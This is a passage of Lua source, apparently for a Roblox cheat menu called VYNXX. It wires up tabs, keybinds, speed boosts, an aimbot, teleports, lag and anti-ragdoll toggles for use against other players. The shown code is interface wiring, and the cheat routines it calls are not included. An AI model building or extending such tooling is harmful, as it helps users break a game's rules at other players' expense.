    TabsLayoutR.FillDirection = Enum.FillDirection.Vertical
    TabsLayoutR.Padding = UDim.new(0, 28)
    TabsLayoutR.HorizontalAlignment = Enum.HorizontalAlignment.Center
    TabsLayoutR.SortOrder = Enum.SortOrder.LayoutOrder
    TabsLayoutR.Parent = TabBarR
    local TabPadR = Instance.new("UIPadding")
    TabPadR.PaddingTop = UDim.new(0, 16)
    TabPadR.PaddingBottom = UDim.new(0, 16)
    TabPadR.Parent = TabBarR

    local TUtil = uiMakeTab(TabBarR,"Tab_UTIL","Utility",nil,false); TUtil.LayoutOrder=1
    local TKB   = uiMakeTab(TabBarR,"Tab_KB","Keybinds",nil,false); TKB.LayoutOrder=2

    
    local PagedContent = Instance.new("Frame")
    PagedContent.Name = "PagedContent"
    PagedContent.Position = UDim2.new(0, 118, 0, 56)
    PagedContent.Size = UDim2.new(1, -236, 1, -68)
    PagedContent.BackgroundTransparency = 1
    PagedContent.Parent = Frame


    
    local PM    = uiMakePage(PagedContent, "Page_SPEED",     1, true)
    local PMech = uiMakePage(PagedContent, "Page_MECHANICS", 2, false)
    local PVis  = uiMakePage(PagedContent, "Page_VISUALS",   3, false)
    local PUtil = uiMakePage(PagedContent, "Page_UTILITY",   4, false)
    local PKB   = uiMakePage(PagedContent, "Page_KEYBINDS",  5, false)

    local Pages = {SPEED=PM, MECHANICS=PMech, VISUALS=PVis, UTILITY=PUtil, KEYBINDS=PKB}
    local Tabs  = {SPEED=TSpeed, MECHANICS=TMech, VISUALS=TVis, UTILITY=TUtil, KEYBINDS=TKB}
    local curTab = "SPEED"

    local function switchTab(name)
        if curTab == name then return end; curTab = name
        for k,p in pairs(Pages) do p.Visible = (k==name) end
        for k,b in pairs(Tabs) do
            local act = (k==name)
            b:SetAttribute("IsActiveTab", act)
            local tabOn = (UI_ROW_BG or themeDarkFromAccent(UI_ACCENT or Color3.fromRGB(165,75,255), 0.22))
            local tabOff = Color3.fromRGB(14, 14, 18)
            b.BackgroundColor3 = act and tabOn or tabOff
            b.BackgroundTransparency = act and 0.05 or 1
            b.TextColor3 = act and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(140, 140, 155)
            b.TextStrokeTransparency = 1
            local st = b:FindFirstChild("TabStroke")
            if st then
                st.Color = act and (UI_ACCENT or Color3.fromRGB(255,255,255)) or Color3.fromRGB(36, 36, 44)
                st.Thickness = 1
                st.Transparency = act and 0.35 or 1
            end
        end
    end
    M.selectTab = switchTab

    TSpeed.MouseButton1Click:Connect(function() switchTab("SPEED") end)
    TMech.MouseButton1Click:Connect(function() switchTab("MECHANICS") end)
    TVis.MouseButton1Click:Connect(function() switchTab("VISUALS") end)
    TUtil.MouseButton1Click:Connect(function() switchTab("UTILITY") end)
    TKB.MouseButton1Click:Connect(function() switchTab("KEYBINDS") end)

    
    local function closeUI()
        local tween = TweenService:Create(Frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
            Size = UDim2.new(0, 560, 0, 0),
            Position = Frame.Position + UDim2.new(0, 0, 0, 270),
            BackgroundTransparency = 1
        })
        tween:Play()
        tween.Completed:Connect(function()
            Frame.Visible = false
            Frame.Size = UDim2.new(0, 560, 0, 540)
            Frame.Position = UDim2.new(0, 28, 0.38, -120)
            Frame.BackgroundTransparency = 0
        end)
    end
    local MinPill = Instance.new("Frame")
    MinPill.Visible=false; MinPill.Active=true; MinPill.ZIndex=40
    MinPill.AnchorPoint = Vector2.new(0.5, 0)
    
    MinPill.Position = UDim2.new(0.5, 0, 0, 12)
    MinPill.Size = UDim2.new(0, 110, 0, 32)
    MinPill.BackgroundColor3=Color3.fromRGB(0,0,0); MinPill.BackgroundTransparency=0; MinPill.BorderSizePixel=0; MinPill.Parent=gui
    Instance.new("UICorner",MinPill).CornerRadius=UDim.new(1, 0)
    do
        local pst = Instance.new("UIStroke")
        pst.Color = Color3.fromRGB(255, 255, 255)
        pst.Thickness = 1
        pst.Transparency = 0.5
        pst.Parent = MinPill
    end
    do
        local l=Instance.new("TextLabel"); l.Size=UDim2.new(1,0,1,0); l.BackgroundTransparency=1; l.Text="VYNXX"; l.TextColor3=Color3.fromRGB(255,255,255); l.TextSize=13; l.Font=Enum.Font.GothamBlack; l.Parent=MinPill
        local b=Instance.new("TextButton"); b.ZIndex=41; b.Size=UDim2.new(1,0,1,0); b.BackgroundTransparency=1; b.Text=""; b.AutoButtonColor=false; b.Parent=MinPill
        b.MouseButton1Click:Connect(function()
            MinPill.Visible=false; Frame.Visible=true
            M.menuOpen = true
            pcall(saveCherryConfig)
        end)
    end

    local function minimize()
        Frame.Visible=false; MinPill.Visible=true

        M.menuOpen=false; pcall(saveCherryConfig)
    end
    MinBtn.MouseButton1Click:Connect(minimize)

    
    do
        local function makeDrag(obj, target, saveKey)
            local drag,dStart,sPos
            obj.InputBegan:Connect(function(i)
                if M.uiLocked then return end
                if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
                    drag=true; dStart=i.Position; sPos=target.Position
                    i.Changed:Connect(function()
                        if i.UserInputState==Enum.UserInputState.End then
                            drag=false
                            if saveKey == "menu" then
                                local p = target.Position
                                M.menuPos = {p.X.Scale, p.X.Offset, p.Y.Scale, p.Y.Offset}
                                pcall(saveCherryConfig)
                            end
                        end
                    end)
                end
            end)
            obj.InputChanged:Connect(function(i)
                if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
                    if drag then
                        local d=i.Position-dStart
                        target.Position=UDim2.new(sPos.X.Scale,sPos.X.Offset+d.X,sPos.Y.Scale,sPos.Y.Offset+d.Y)
                    end
                end
            end)
            UIS.InputChanged:Connect(function(i)
                if drag and M.uiLocked then drag=false end
            end)
        end
        makeDrag(Header, Frame, "menu")
        makeDrag(MinPill, MinPill)
    end

    
    M._anyKeyListening = false
    local activeKBBtn = nil
    M.keybindButtons = M.keybindButtons or {}
    local listeningTimeout = nil

    local function resetKeybindCapture()
        if activeKBBtn then
            for e,b in pairs(M.keybindButtons) do
                if b == activeKBBtn then
                    local parts = {}
                    if e.kb then table.insert(parts, e.kb.Name) end
                    if e.gp then table.insert(parts, e.gp.Name) end
                    b.Text = (#parts > 0) and table.concat(parts, " / ") or "..."
                    b.TextColor3 = UI_TEXT_DIM
                    break
                end
            end
            activeKBBtn = nil
            M._anyKeyListening = false
            if listeningTimeout then task.cancel(listeningTimeout); listeningTimeout = nil end
        end
    end

    local function formatKeybindText(entry)
        if not entry then return "..." end
        local parts = {}
        if entry.kb then table.insert(parts, entry.kb.Name) end
        if entry.gp then table.insert(parts, entry.gp.Name) end
        if #parts == 0 then return "..." end
        return table.concat(parts, " / ")
    end

    local function isGamepadInputType(uit)
        return uit == Enum.UserInputType.Gamepad1
            or uit == Enum.UserInputType.Gamepad2
            or uit == Enum.UserInputType.Gamepad3
            or uit == Enum.UserInputType.Gamepad4
            or uit == Enum.UserInputType.Gamepad5
            or uit == Enum.UserInputType.Gamepad6
            or uit == Enum.UserInputType.Gamepad7
            or uit == Enum.UserInputType.Gamepad8
    end

    local function uiKeybindRow(parent, label, kbEntry)
        local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
        r.BackgroundColor3 = UI_ROW_BG; r.BackgroundTransparency = 0.1; r.BorderSizePixel = 0; r.Parent = parent; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,13,0,0); l.Size=UDim2.new(0.55,0,0,44); l.BackgroundTransparency=1
        l.Text=label; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=13; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local btn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-150,0.5,-12), Size=UDim2.new(0,140,0,25),
            Text=formatKeybindText(kbEntry),
            Col=UI_TEXT_DIM, TS=10, CR=6})
        M.keybindButtons[kbEntry] = btn
        M.keybindLabelRefs = M.keybindLabelRefs or {}
        M.keybindLabelRefs[kbEntry] = l

        btn.MouseButton1Click:Connect(function()
            if activeKBBtn and activeKBBtn ~= btn then resetKeybindCapture() end
            activeKBBtn = btn
            btn.Text = "Press key / button..."
            btn.TextColor3 = Color3.fromRGB(150,150,150)
            M._anyKeyListening = true
            if listeningTimeout then task.cancel(listeningTimeout) end
            listeningTimeout = task.delay(8, resetKeybindCapture)
        end)
        return r
    end

    local function kbMatch(entry, keycode)
        if not entry or not keycode or keycode == Enum.KeyCode.Unknown then return false end
        if entry.kb and entry.kb == keycode then return true end
        if entry.gp and entry.gp == keycode then return true end
        return false
    end

    local function handleKeybindAction(kc)
        if not kc or kc == Enum.KeyCode.Unknown then return end

        if kbMatch(M.KB.LaggerToggle, kc) then
            local now = tick()
            if not M._lastLaggerBindPress or now - M._lastLaggerBindPress > 0.28 then
                M._lastLaggerBindPress = now
                M.cycleLaggerModeBind()
            end
            return
        end
        if kbMatch(M.KB.LaggerCarry, kc) then
            local now = tick()
            if not M._lastLaggerCarryBindPress or now - M._lastLaggerCarryBindPress > 0.15 then
                M._lastLaggerCarryBindPress = now
                M.toggleLaggerCarry()
            end
            return
        end
        if kbMatch(M.KB.SpeedToggle, kc) then M.toggleCarryMode(); saveCherryConfig() end
        if kbMatch(M.KB.DropBrainrot, kc) then M.runDrop() end
        if kbMatch(M.KB.TPFloor, kc) then M.runTPFloor() end
        if kbMatch(M.KB.AutoLeft, kc) then     M.autoLeftEnabled = not M.autoLeftEnabled
            if M.autoLeftEnabled then
                if M.autoRightEnabled then M.autoRightEnabled = false; M.stopAutoRight() end
                if M.autoBatEnabled then M.stopBatAimbot() end
                M.startAutoLeft()
            else M.stopAutoLeft() end
            if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
            if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
            saveCherryConfig()
        end
        if kbMatch(M.KB.AutoRight, kc) then
            M.autoRightEnabled = not M.autoRightEnabled
            if M.autoRightEnabled then
                if M.autoLeftEnabled then M.autoLeftEnabled = false; M.stopAutoLeft() end
                if M.autoBatEnabled then M.stopBatAimbot() end
                M.startAutoRight()
            else M.stopAutoRight() end
            if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
            if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
            saveCherryConfig()
        end
        if kbMatch(M.KB.AutoBat, kc) then
            if not M.autoBatEnabled then
                if M.autoLeftEnabled then M.autoLeftEnabled = false; M.stopAutoLeft() end
                if M.autoRightEnabled then M.autoRightEnabled = false; M.stopAutoRight() end
                M.queueAutoBatStart()
            else M.stopBatAimbot() end
            if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
            if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
            saveCherryConfig()
        end
        if kbMatch(M.KB.BypassAimbot, kc) then
            M.toggleBypassAimbot()
            if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
            if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
            saveCherryConfig()
        end
        if kbMatch(M.KB.GuiHide, kc) then
            if Frame then
                Frame.Visible = not Frame.Visible
                MinPill.Visible = not Frame.Visible
                M.menuOpen = Frame.Visible == true
                pcall(saveCherryConfig)
            end
        end
    end

    M._keybindCaptureConn = UIS.InputBegan:Connect(function(input, gameProcessed)
        local uit = input.UserInputType
        local kc = input.KeyCode
        local isPad = isGamepadInputType(uit)

        
        if M._anyKeyListening then
            if activeKBBtn then
                if kc == Enum.KeyCode.Escape or (isPad and kc == Enum.KeyCode.ButtonB) then
                    resetKeybindCapture(); pcall(saveCherryConfig); return
                end
                if uit == Enum.UserInputType.Keyboard and kc ~= Enum.KeyCode.Unknown then
                    for e,b in pairs(M.keybindButtons) do
                        if b == activeKBBtn then
                            e.kb = kc
                            b.Text = formatKeybindText(e)
                            b.TextColor3 = UI_TEXT_DIM
                            activeKBBtn = nil; M._anyKeyListening = false
                            if listeningTimeout then task.cancel(listeningTimeout); listeningTimeout = nil end
                            pcall(saveCherryConfig)
                            break
                        end
                    end
                elseif isPad and kc ~= Enum.KeyCode.Unknown then
                    for e,b in pairs(M.keybindButtons) do
                        if b == activeKBBtn then
                            e.gp = kc
                            b.Text = formatKeybindText(e)
                            b.TextColor3 = UI_TEXT_DIM
                            activeKBBtn = nil; M._anyKeyListening = false
                            if listeningTimeout then task.cancel(listeningTimeout); listeningTimeout = nil end
                            pcall(saveCherryConfig)
                            break
                        end
                    end
                end
            end
            return
        end

        
        
        if uit == Enum.UserInputType.Keyboard then
            if gameProcessed then return end
            handleKeybindAction(kc)
        elseif isPad then
            if kc == Enum.KeyCode.Unknown then return end
            handleKeybindAction(kc)
        end
    end)

    
    
    

    
    uiSectionHeader(PM, "SPEED STYLE")
    do
        local modeOpts = {"Original", "Customizer"}
        local modeIdx = ((M.speedUIMode or "Original") == "Customizer") and 2 or 1
        local _, setSpeedUIMode = uiChoiceRow(PM, "Speed UI Mode", modeOpts, modeIdx, function(v)
            M.speedUIMode = (v == "Original") and "Original" or "Customizer"
            pcall(function() M.refreshSpeedCustomKeybindLabels() end)
            if M.speedUIMode ~= "Original" then
                M.autoSwitchSpeedEnabled = false
                M.autoTurnOffSpeedEnabled = false
                M.autoSwitchLaggerSpeedEnabled = false
                
                M.carrySpeedActive = false
                M.laggerCarryActive = false
                M.laggerModeEnabled = false
                M.speedBoosterPath = "Normal"
                if M.speedBoosterSyncPath then pcall(function() M.speedBoosterSyncPath("Normal") end) end
                if M.speedBoosterRefresh then pcall(M.speedBoosterRefresh) end
                if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(false) end) end
                if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(false) end) end
                if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(false) end) end
                if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
                if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
                if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
            else
                
                M.carrySpeedActive = false
                M.laggerCarryActive = false
                M.laggerModeEnabled = false
                if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(false) end) end
                if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(false) end) end
                if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(false) end) end
                if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
                if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
                if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
            end
            if M.refreshSpeedModeLabel then pcall(M.refreshSpeedModeLabel) end
            if M._refreshSpeedUIBlocks then M._refreshSpeedUIBlocks() end
            pcall(function() M.refreshWalkSpeedAutoSwitch() end)
            if M.mobileButtonsEnabled then
                pcall(function() M.buildMobileButtons() end)
            end
            saveCherryConfig()
        end)
        M.setSpeedUIModeVisual = setSpeedUIMode
    end

    local customizerWrap = Instance.new("Frame")
    customizerWrap.Name = "CustomizerWrap"
    customizerWrap.BackgroundTransparency = 1
    customizerWrap.Size = UDim2.new(1, 0, 0, 0)
    customizerWrap.AutomaticSize = Enum.AutomaticSize.Y
    customizerWrap.Parent = PM
    Instance.new("UIListLayout", customizerWrap).Padding = UDim.new(0, 8)

    local originalWrap = Instance.new("Frame")
    originalWrap.Name = "OriginalWrap"
    originalWrap.BackgroundTransparency = 1
    originalWrap.Size = UDim2.new(1, 0, 0, 0)
    originalWrap.AutomaticSize = Enum.AutomaticSize.Y
    originalWrap.Parent = PM
    Instance.new("UIListLayout", originalWrap).Padding = UDim.new(0, 8)

    
    do
        local _, setBoosterOpen = uiToggleRow(customizerWrap, "Open Speed Customizer", M.speedBoosterPanelOpen ~= false, function(on)
            M.setSpeedBoosterPanelOpen(on)
        end)
        M.setSpeedBoosterPanelVisual = setBoosterOpen
        uiActionRow(customizerWrap, "Reset Customizer Position", function()
            M.resetSpeedBoosterPosition()
        end)
        pcall(function()
            if not M.speedBoosterMain then M.buildSpeedBoosterUI() end
            if M.speedBoosterMain then M.speedBoosterMain.Visible = (M.speedBoosterPanelOpen ~= false) end
        end)
    end

    
    do
        local _, nsBox = uiNumberRow(originalWrap, "Normal Speed", M.NS, 1, 500, function(v) M.NS = v end)
        local _, csBox = uiNumberRow(originalWrap, "Carry Speed", M.CS, 1, 500, function(v) M.CS = v end)
        local _, lsBox = uiNumberRow(originalWrap, "Lagger Normal", M.LAGGER_SPEED, 1, 500, function(v) M.LAGGER_SPEED = v end)
        local _, lcBox = uiNumberRow(originalWrap, "Lagger Carry", M.LAGGER_CARRY_SPEED, 1, 500, function(v) M.LAGGER_CARRY_SPEED = v end)
        local _, abSpeedBox = uiNumberRow(originalWrap, "Aimbot Speed", tonumber(M.aimbotSpeed) or 57, 1, 200, function(v)
            M.aimbotSpeed = v
            saveCherryConfig()
        end)
        M.aimbotSpeedBox = abSpeedBox
        M.normalBox = nsBox; M.carryBox = csBox; M.laggerBox = lsBox

        do
            local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
            r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=originalWrap; uiCardStyle(r)
            local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
            l.BackgroundTransparency=1; l.Text="Carry Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
            local carryBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
                Text=M.carrySpeedActive and "Carry On" or "Carry Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
            carryBtn.MouseButton1Click:Connect(function()
                M.toggleCarryMode()
                carryBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
            end)
            M.carryModeBtn = carryBtn
        end
        do
            local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
            r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=originalWrap; uiCardStyle(r)
            local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
            l.BackgroundTransparency=1; l.Text="Lagger Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
            local modeBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
                Text=M.laggerModeEnabled and "Lag On" or "Lag Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
            modeBtn.MouseButton1Click:Connect(function()
                M.toggleLaggerMode()
                modeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
            end)
            M.laggerModeBtn = modeBtn
        end
        do
            local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
            r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=originalWrap; uiCardStyle(r)
            local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
            l.BackgroundTransparency=1; l.Text="Lagger Carry Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
            local modeBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
                Text=M.laggerCarryActive and "L.Carry On" or "L.Carry Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
            modeBtn.MouseButton1Click:Connect(function()
                M.toggleLaggerCarry()
                modeBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
            end)
            M.laggerCarryBtn = modeBtn
        end

        local _, setAutoCarry = uiToggleRow(originalWrap, "Auto Carry Speed", M.autoSwitchSpeedEnabled, function(on)
            M.autoSwitchSpeedEnabled = on
            M._autoSwitchWasSteal = nil
            M.refreshWalkSpeedAutoSwitch()
            saveCherryConfig()
        end)
        M.setAutoCarryVisual = setAutoCarry
        local _, setAutoTurnOff = uiToggleRow(originalWrap, "Auto Turn Off Speed", M.autoTurnOffSpeedEnabled, function(on)
            M.autoTurnOffSpeedEnabled = on
            M.refreshWalkSpeedAutoSwitch()
            saveCherryConfig()
        end)
        M.setAutoTurnOffVisual = setAutoTurnOff
        local _, setAutoLagSwitch = uiToggleRow(originalWrap, "Auto Switch Lagger Speed", M.autoSwitchLaggerSpeedEnabled, function(on)
            M.autoSwitchLaggerSpeedEnabled = on
            M.refreshWalkSpeedAutoSwitch()
            saveCherryConfig()
        end)
        M.setAutoSwitchLaggerVisual = setAutoLagSwitch
    end

    local function refreshSpeedUIBlocks()
        local isCustom = (M.speedUIMode or "Original") ~= "Original"
        customizerWrap.Visible = isCustom
        originalWrap.Visible = not isCustom
        if isCustom then
            M.autoSwitchSpeedEnabled = false
            M.autoTurnOffSpeedEnabled = false
            M.autoSwitchLaggerSpeedEnabled = false
            pcall(function() M.refreshWalkSpeedAutoSwitch() end)
            if not M.speedBoosterMain then pcall(M.buildSpeedBoosterUI) end
            if M.speedBoosterMain then M.speedBoosterMain.Visible = (M.speedBoosterPanelOpen ~= false) end
        else
            if M.speedBoosterMain then M.speedBoosterMain.Visible = false end
        end
    end
    M._refreshSpeedUIBlocks = refreshSpeedUIBlocks
    refreshSpeedUIBlocks()

    local _, setAutoCarryBase = uiToggleRow(PM, "Auto Carry on Enemy Base", M.autoCarryEnemyBaseEnabled, function(on)
        M.setAutoCarryEnemyBase(on)
        saveCherryConfig()
    end)
    M.setAutoCarryEnemyBaseVisual = setAutoCarryBase
    local _, acbRangeBox = uiNumberRow(PM, "Enemy Base Range", M.autoCarryEnemyBaseRange or 35, 5, 150, function(v)
        M.autoCarryEnemyBaseRange = v
        saveCherryConfig()
    end)
    M.autoCarryEnemyBaseRangeBox = acbRangeBox

    uiSectionHeader(PM, "SHARE SETTINGS")
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PM; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-170,1,0)
        l.BackgroundTransparency=1; l.Text="Copy Settings"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local cBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-150,0.5,-13), Size=UDim2.new(0,138,0,26),
            Text="COPY CODE", Col=UI_TEXT_PRIMARY, TS=11, CR=6, SC=UI_ACCENT, STr=0.3})
        cBtn.MouseButton1Click:Connect(function()
            local code, copied = M.copyShareToClipboard()
            cBtn.Text = copied and "COPIED!" or "CODE READY"
            
            if not copied and code then
                pcall(function()
                    local sg = Instance.new("ScreenGui")
                    sg.Name = "VynxCopyCode"
                    sg.DisplayOrder = 200
                    sg.Parent = player:WaitForChild("PlayerGui")
                    local tb = Instance.new("TextBox", sg)
                    tb.Size = UDim2.new(0, 320, 0, 80)
                    tb.Position = UDim2.new(0.5, -160, 0.2, 0)
                    tb.Text = code
                    tb.ClearTextOnFocus = false
                    tb.TextWrapped = true
                    tb.Font = Enum.Font.Code
                    tb.TextSize = 10
                    tb.BackgroundColor3 = Color3.fromRGB(20,20,24)
                    tb.TextColor3 = Color3.fromRGB(255,255,255)
                    Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 8)
                    tb:CaptureFocus()
                    task.delay(8, function() if sg then sg:Destroy() end end)
                end)
            end
            task.delay(1.2, function() if cBtn and cBtn.Parent then cBtn.Text = "COPY CODE" end end)
        end)
    end
    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=UI_ROW_BG; r.BackgroundTransparency=0.03; r.BorderSizePixel=0; r.Parent=PM; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-170,1,0)
        l.BackgroundTransparency=1; l.Text="Load Settings"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local lBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-150,0.5,-13), Size=UDim2.new(0,138,0,26),
            Text="LOAD CODE", Col=UI_TEXT_PRIMARY, TS=11, CR=6, SC=UI_ACCENT, STr=0.3})
        lBtn.MouseButton1Click:Connect(function()
            M.openLoadSettingsPrompt()
        end)
    end


    
    uiSectionHeader(PMech, "COMBAT")

    
    do
        local combatThemes = M.COMBAT_COLOR_THEMES or {"White", "Purple", "Red", "Green"}
        local curName = CherryConfig.Theme or M.colorScheme or M._savedTheme or "Purple"
        
        if curName == "Default" then curName = "Red"
        elseif curName == "Forest" then curName = "Green"
        elseif not CHERRY_THEMES[curName] then curName = "Red" end
        local themeIdx = 1
        for i, n in ipairs(combatThemes) do
            if n == curName then themeIdx = i break end
        end
        local _, setCombatThemeUI = uiChoiceRow(PMech, "Color Theme", combatThemes, themeIdx, function(v)
            if M.applyCombatTheme then
                M.applyCombatTheme(v, true)
            else
                if not CHERRY_THEMES[v] then return end
                CherryConfig.Theme = v
                M.colorScheme = v
                M._savedTheme = v
                pcall(applyAccentFromTheme)
                pcall(saveCherryConfig)
                task.defer(function()
                    pcall(function() if M.buildGui then M.buildGui() end end)
                    pcall(function() if M.recolorAllVynxGuis then M.recolorAllVynxGuis() end end)
                end)
            end
        end)
        M.setCombatThemeUI = setCombatThemeUI
    end

    local _, setBatAimbot = uiToggleRow(PMech, "Bat Aimbot", M.autoBatEnabled, function(on)
        if on then M.queueAutoBatStart() else M.stopBatAimbot() end
    end)
    M.autoBatSetVisual = setBatAimbot


    local _, setBatCounter = uiToggleRow(PMech, "Bat Counter", M.batCounterEnabled, function(on)
        M.batCounterEnabled = on
        if on then M.startBatCounter() else M.stopBatCounter() end
    end)
    M.setBatCounterVisual = setBatCounter

    local _, setBypassVis = uiToggleRow(PMech, "Bat TP", M.bypassAimbotEnabled, function(on)
        M.bypassAimbotEnabled = on
        if on then M.startBypassAimbot() else M.stopBypassAimbot() end
        if M.setBypassVisual then M.setBypassVisual(on) end
        if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(on) end
        saveCherryConfig()
    end)
    M.setBypassVisual = setBypassVis

    local _, setHardHitVis = uiToggleRow(PMech, "Hard Hit", M.hardHitEnabled, function(on)
        M.hardHitEnabled = on
        if on then M.startHardHit() else M.stopHardHit() end
        if M.setHardHitVisual then M.setHardHitVisual(on) end
        saveCherryConfig()
    end)
    M.setHardHitVisual = setHardHitVis

    local _, hhRadBox = uiNumberRow(PMech, "Hard Hit Radius", M.hardHitRadius, 1, 100, function(v)
        M.hardHitRadius = v
        saveCherryConfig()
    end)
    M.hardHitRadiusBox = hhRadBox




    local _, setAntiDie = uiToggleRow(PMech, "Anti Die", M.antiDieEnabled, function(on)
        if on then M.startAntiDie() else M.stopAntiDie() end
        saveCherryConfig()
    end)
    M.setAntiDieVisual = setAntiDie

    local _, setAntiFling = uiToggleRow(PMech, "Anti Fling", M.antiFlingEnabled ~= false, function(on)
        if on then M.startAntiFling() else M.stopAntiFling() end
        saveCherryConfig()
    end)

    local _, setAntiRag = uiToggleRow(PMech, "Anti Ragdoll", M.antiRagdollEnabled, function(on)
        M.antiRagdollEnabled = on
        if on then M.startAntiRagdoll() else M.stopAntiRagdoll() end
    end)
    M.setAntiRagVisual = setAntiRag

    local _, setAntiRagModeUI = uiChoiceRow(PMech, "Anti Ragdoll Mode", {"Splatter","No Splatter"},
        M.antiRagdollMode == "No Splatter" and 2 or 1,
        function(newMode)
            M.antiRagdollMode = (newMode == "No Splatter") and "No Splatter" or "Splatter"
            if M.antiRagdollEnabled then M.stopAntiRagdoll(); M.startAntiRagdoll() end
        end
    )
    M.setAntiRagModeUI = setAntiRagModeUI

    local _, setRagTPBase = uiToggleRow(PMech, "Ragdoll TP Base", M.ragdollTPBaseEnabled, function(on)
        if on then M.startRagdollTPBase() else M.stopRagdollTPBase() end
        saveCherryConfig()
    end)
    M.setRagdollTPBaseVisual = setRagTPBase

    local _, ragTPRangeBox = uiNumberRow(PMech, "Ragdoll TP Range", M.ragdollTPBaseRange or 50, 5, 200, function(v)
        M.ragdollTPBaseRange = v
        saveCherryConfig()
    end)
    M.ragdollTPBaseRangeBox = ragTPRangeBox

    local _, setMedusa = uiToggleRow(PMech, "Medusa Counter", M.medusaCounterEnabled, function(on)
        M.medusaCounterEnabled = on
        if on then M.setupMedusa(player.Character) else M.stopMedusaCounter() end
    end)
    M.setMedusaVisual = setMedusa
    

    local _, setAutoSwing = uiToggleRow(PMech, "Auto Swing", M.autoSwingEnabled, function(on)
        M.autoSwingEnabled = on
    end)
